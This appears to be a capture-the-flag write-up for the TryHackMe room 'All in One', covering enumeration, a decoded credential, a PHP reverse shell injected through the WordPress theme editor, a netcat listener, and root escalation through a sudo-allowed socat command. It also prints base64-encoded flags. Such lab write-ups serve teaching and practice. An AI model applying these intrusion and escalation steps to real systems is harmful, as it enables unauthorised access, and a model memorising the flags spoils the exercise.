# All in One
Enumerating the machine with nmap, we get:
```
➜  ~ nmap -sV 10.10.145.227
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 10:10 CET
Nmap scan report for 10.10.145.227
Host is up (0.046s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
```
First of all we might check if the ftp server has anonymous access:
```
➜  ~ ftp 10.10.145.227 
Connected to 10.10.145.227.
220 (vsFTPd 3.0.3)
Name (10.10.145.227:emil): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Nice, but there is nothing of interest in the directory and we don't have write permissions...
Accessing the http server on port 80 yields nothing but the standard Apache2 default page.
Enumerating for directories shows us:
```
➜  ~ gobuster dir --url http://10.10.145.227/ --wordlist=/home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.145.227/
[+] Method:         GET
[+] Threads:        100
[+] Wordlist:       /home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Timeout:        10s
===============================================================
2020/12/10 10:16:16 Starting gobuster in directory enumeration mode
===============================================================
/wordpress (Status: 301)      
/hackathons (Status: 200)      
/server-status (Status: 403)     
                                  
===============================================================
2020/12/10 10:18:48 Finished
===============================================================
```
Seeing whats inside `/hackathons` we get:
```
➜  ~ curl http://10.10.145.227/hackathons
<html>
  <body>
    <h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>
    <!-- Dvc W@iyur@123 -->
    <!-- KeepGoing -->
  </body>
</html>
```
Hate vinegar? Smells like a vigenére cipher. 
Trying to decode `Dvc W@iyur@123` with the key `KeepGoing` gives us:
```
Try <REDACTED>
```
Sweet, looks like a password for something.

Now lets look at the `/wordpress` directory.
It doesn't show much. It only has one post made by the user `elyana`.
We can now check if the user and the password found before match by going to `/wordpress/wp-admin`.
Awesome! They work. We're now logged in as `elyana` on the wordpress dashboard.
We can see that `elyana` is an administrator by going to the users page. How convinient.
We can now browse to the `Appearance>Theme Editor` and inject a webshell in one of the themes php files.
I used the `php-reverse-shell` from pentestmonkey and injected the code to index.php.
Setting by a netcat listner and browsing to the main page of the site, we get a shell:
```
➜  ~ nc -lnvp 1234
Connection from 10.10.145.227:39436
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:46:01 up  1:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Checking which users have a home directory on the system we find:
```
$ cd /home
$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Oct  5 19:38 .
drwxr-xr-x 24 root   root   4096 Oct  5 19:33 ..
drwxr-xr-x  6 elyana elyana 4096 Oct  7 13:41 elyana
$ cd elyana
$ ls -la
total 48
drwxr-xr-x 6 elyana elyana 4096 Oct  7 13:41 .
drwxr-xr-x 3 root   root   4096 Oct  5 19:38 ..
-rw------- 1 elyana elyana 1632 Oct  7 13:42 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4096 Oct  5 19:38 .cache
drwxr-x--- 3 root   root   4096 Oct  5 20:03 .config
drwx------ 3 elyana elyana 4096 Oct  5 19:38 .gnupg
drwxrwxr-x 3 elyana elyana 4096 Oct  5 20:43 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5 19:38 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6 20:24 hint.txt
-rw------- 1 elyana elyana   61 Oct  6 20:28 user.txt
$ cat hint.txt  
Elyana's user password is hidden in the system. Find it ;)
```
Searching for readable files owned by `elyana` we get:
```
$ find / -user elyana -perm -004 2>/dev/null
/home/elyana
/home/elyana/.local
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
```
Hmmm.. `private.txt` seems promising:
```
$ cat /etc/mysql/conf.d/private.txt
user: elyana
password: <REDACT>
```
Awesome! To get a proper shell we can now try to login with ssh:
```
➜  ~ ssh elyana@10.10.145.227
elyana@10.10.145.227's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 10 09:53:33 UTC 2020

  System load:  0.09              Processes:           115
  Usage of /:   53.6% of 6.41GB   Users logged in:     0
  Memory usage: 49%               IP address for eth0: 10.10.145.227
  Swap usage:   0%


16 packages can be updated.
0 updates are security updates.


Last login: Fri Oct  9 08:09:56 2020
-bash-4.4$
```
We can now read the flag:
```
-bash-4.4$ cat user.txt 
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```
That's not the proper flag format? It does however look like base64.
```
-bash-4.4$ base64 -d user.txt 
THM{<REDACTED>}
```
Now lets get to rooting ;)
Seeing what we're able to run with sudo:
```
-bash-4.4$ sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
```
According to the man page of `socat`: "Socat is a command line based utility that establishes two bidirectional byte streams and transfers data between them." 
Wonder what would happen if we tried to stream between STDIN and let's say `/bin/bash`?
```
-bash-4.4$ sudo socat stdin exec:/bin/sh
whoami
root
```
Now we can read the root flag:
```
cat /root/root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
```
Seems like this is also in base64:
```
base64 -d /root/root.txt
THM{<REDACTED>}
```
